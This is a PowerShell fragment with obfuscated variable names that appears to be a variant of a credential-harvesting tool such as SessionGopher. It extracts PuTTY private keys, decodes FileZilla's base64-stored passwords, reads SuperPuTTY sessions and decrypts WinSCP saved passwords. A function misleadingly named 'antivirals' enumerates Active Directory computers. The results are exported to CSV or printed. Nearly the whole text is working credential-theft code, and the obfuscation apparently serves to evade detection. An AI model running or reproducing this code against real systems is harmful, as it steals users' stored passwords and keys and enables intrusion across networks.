    $9AVgsGqdEND9fXu = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
    $NfcomAmiyeNdChC."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$9AVgsGqdEND9fXu).Context.PostContext -Join "" } catch {}
    $NfcomAmiyeNdChC."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}


    [void]$uTLibPDMibhEOhJ.Add($NfcomAmiyeNdChC)

  }

  if ($uTLibPDMibhEOhJ.count -gt 0) {

    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $uTLibPDMibhEOhJ

    if ($o) {
      $uTLibPDMibhEOhJ | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\PuTTY ppk Files.csv") -NoTypeInformation
    } else {
      Write-Output "PuTTY Private Key Files (.ppk)"
      $uTLibPDMibhEOhJ | Select-Object * | Format-List | Out-String
    }

  }

} # Process PPK File

function ProcessFileZillaFile($DnZtKlK9NayrWx9) {


  foreach($YOuiISCQsVHWWcV in $DnZtKlK9NayrWx9.SelectNodes('//FileZilla3/Servers/Server')) {

      $N9fGnbXbEGgKygO = @{}


      $YOuiISCQsVHWWcV.ChildNodes | ForEach-Object {

          $N9fGnbXbEGgKygO["Source"] = $9dmptIQvAWIrBtO

          if ($_.InnerText) {
              if ($_.Name -eq "Pass") {
                  $N9fGnbXbEGgKygO["Password"] = $_.InnerText
              } else {

                  $N9fGnbXbEGgKygO[$_.Name] = $_.InnerText
              }
              
          }

      }


    [void]$EpFdJVExPKHuYcZ.Add((New-Object PSObject -Property $N9fGnbXbEGgKygO | Select-Object -Property * -ExcludeProperty "#text",LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
     
  } # ForEach FileZillaSession in FileZillaXML.SelectNodes()
  

  foreach ($XqQmLH9cAzise9c in $EpFdJVExPKHuYcZ) {
      $XqQmLH9cAzise9c.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($XqQmLH9cAzise9c.Password))
      if ($XqQmLH9cAzise9c.Protocol -eq "0") {
        $XqQmLH9cAzise9c.Protocol = "Use FTP over TLS if available"
      } elseif ($XqQmLH9cAzise9c.Protocol -eq 1) {
        $XqQmLH9cAzise9c.Protocol = "Use SFTP"
      } elseif ($XqQmLH9cAzise9c.Protocol -eq 3) {
        $XqQmLH9cAzise9c.Protocol = "Require implicit FTP over TLS"
      } elseif ($XqQmLH9cAzise9c.Protocol -eq 4) {
        $XqQmLH9cAzise9c.Protocol = "Require explicit FTP over TLS"
      } elseif ($XqQmLH9cAzise9c.Protocol -eq 6) {
        $XqQmLH9cAzise9c.Protocol = "Only use plain FTP (insecure)"
      } 
  }

  if ($o) {
    $EpFdJVExPKHuYcZ | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\FileZilla.csv") -NoTypeInformation
  } else {
    Write-Output "FileZilla Sessions"
    $EpFdJVExPKHuYcZ | Format-List | Out-String
  }


  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -Value $EpFdJVExPKHuYcZ

} # ProcessFileZillaFile

function ProcessSuperPuTTYFile($VhtJEeNXNsVmvvQ) {

  foreach($LZUdNtxVeir9p9W in $VhtJEeNXNsVmvvQ.ArrayOfSessionData.SessionData) {

    foreach ($9otnrfkDzoykjUa in $LZUdNtxVeir9p9W) { 
      if ($9otnrfkDzoykjUa -ne $null) {

        $UmBMwIGmSTwtYin = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"

        $UmBMwIGmSTwtYin."Source" = $9dmptIQvAWIrBtO
        $UmBMwIGmSTwtYin."SessionId" = $9otnrfkDzoykjUa.SessionId
        $UmBMwIGmSTwtYin."SessionName" = $9otnrfkDzoykjUa.SessionName
        $UmBMwIGmSTwtYin."Host" = $9otnrfkDzoykjUa.Host
        $UmBMwIGmSTwtYin."Username" = $9otnrfkDzoykjUa.Username
        $UmBMwIGmSTwtYin."ExtraArgs" = $9otnrfkDzoykjUa.ExtraArgs
        $UmBMwIGmSTwtYin."Port" = $9otnrfkDzoykjUa.Port
        $UmBMwIGmSTwtYin."PuTTY Session" = $9otnrfkDzoykjUa.PuttySession

        [void]$muzrifeMsMRPGSl.Add($UmBMwIGmSTwtYin)
      } 
    }

  } # ForEach SuperPuTTYSessions

  if ($o) {
    $muzrifeMsMRPGSl | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\SuperPuTTY.csv") -NoTypeInformation
  } else {
    Write-Output "SuperPuTTY Sessions"
    $muzrifeMsMRPGSl | Out-String
  }


  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "SuperPuTTY Sessions" -Value $muzrifeMsMRPGSl

} # ProcessSuperPuTTYFile








function antivirals {

  $MrTg9cPVNelZ99s = "computer"
  $rmh9BwAZMjeo9wW = New-Object System.DirectoryServices.DirectoryEntry
  $mdEsFuDcLgbHjkl = New-Object System.DirectoryServices.DirectorySearcher
  $mdEsFuDcLgbHjkl.SearchRoot = $rmh9BwAZMjeo9wW
  $mdEsFuDcLgbHjkl.Filter = ("(objectCategory=$MrTg9cPVNelZ99s)")

  $YXrlxH9EOqo9FPe = "name"

  foreach ($i in $YXrlxH9EOqo9FPe){$mdEsFuDcLgbHjkl.PropertiesToLoad.Add($i)}

  return $mdEsFuDcLgbHjkl.FindAll()

}

function DecryptNextCharacterWinSCP($VlLSIbZJbTFAVBY) {


  $OA9TNnAwFhcVguW = "" | Select-Object -Property flag,remainingPass


  $m9b9TENx9cEPdwE = ("0123456789ABCDEF".indexOf($VlLSIbZJbTFAVBY[0]) * 16)
  $MA9BG9VaxNPDOwp = "0123456789ABCDEF".indexOf($VlLSIbZJbTFAVBY[1])

  $Added = $m9b9TENx9cEPdwE + $MA9BG9VaxNPDOwp

  $ykeyHBRM9ljjHYW = (((-bnot ($Added -bxor $Magic)) % 256) + 256) % 256

  $OA9TNnAwFhcVguW.flag = $ykeyHBRM9ljjHYW
  $OA9TNnAwFhcVguW.remainingPass = $VlLSIbZJbTFAVBY.Substring(2)

  return $OA9TNnAwFhcVguW

}

function DecryptWinSCPPassword($pMagHowSYYxUOt9, $CFOMswWzeftCiiV, $fGXVxzAmP9cBYAr) {

  $tgzYLzOZIIuOZDx = 255
  $Magic = 163

  $len = 0
  $key =  $pMagHowSYYxUOt9 + $CFOMswWzeftCiiV
  $AnNcdMN9byyA9yU = DecryptNextCharacterWinSCP($fGXVxzAmP9cBYAr)

  $KPnpMkxBMzVdcZC = $AnNcdMN9byyA9yU.flag 

  if ($AnNcdMN9byyA9yU.flag -eq $tgzYLzOZIIuOZDx) {
    $AnNcdMN9byyA9yU.remainingPass = $AnNcdMN9byyA9yU.remainingPass.Substring(2)
    $AnNcdMN9byyA9yU = DecryptNextCharacterWinSCP($AnNcdMN9byyA9yU.remainingPass)
  }

  $len = $AnNcdMN9byyA9yU.flag

  $AnNcdMN9byyA9yU = DecryptNextCharacterWinSCP($AnNcdMN9byyA9yU.remainingPass)
  $AnNcdMN9byyA9yU.remainingPass = $AnNcdMN9byyA9yU.remainingPass.Substring(($AnNcdMN9byyA9yU.flag * 2))

  $RzKPAdF9Exc9FnK = ""
  for ($i=0; $i -lt $len; $i++) {
    $AnNcdMN9byyA9yU = (DecryptNextCharacterWinSCP($AnNcdMN9byyA9yU.remainingPass))
    $RzKPAdF9Exc9FnK += [char]$AnNcdMN9byyA9yU.flag
  }

  if ($KPnpMkxBMzVdcZC -eq $tgzYLzOZIIuOZDx) {
    return $RzKPAdF9Exc9FnK.Substring($key.length)
  }

  return $RzKPAdF9Exc9FnK

}
